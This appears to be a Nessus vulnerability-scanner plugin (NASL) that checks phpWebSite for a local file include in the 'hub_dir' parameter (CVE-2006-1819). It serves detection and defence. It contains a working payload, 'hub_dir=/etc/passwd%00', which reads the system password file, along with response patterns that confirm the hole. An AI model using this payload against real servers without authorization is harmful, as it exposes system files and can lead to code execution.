#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The version of phpWebSite installed on the remote host fails to
sanitize input to the 'hub_dir' parameter of the 'index.php' script
before using it in a PHP 'include()' function.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, subject to the privileges of
the web server user id. 

See also :

http://downloads.securityfocus.com/vulnerabilities/exploits/PHPWebSite_fi_poc

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21228);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1819");
  script_bugtraq_id(17521);

  script_name(english:"phpWebSite hub_dir Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd using phpWebSite");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("phpwebsite_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpwebsite"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "hub_dir=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access might still work.
    egrep(pattern:"main\(/etc/passwd\\0conf/config\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (isnull(contents)) report = desc;
    else
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents, repeated three times, of the file\n",
        "'/etc/passwd' that Nessus was able to read from the remote\n",
        "host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
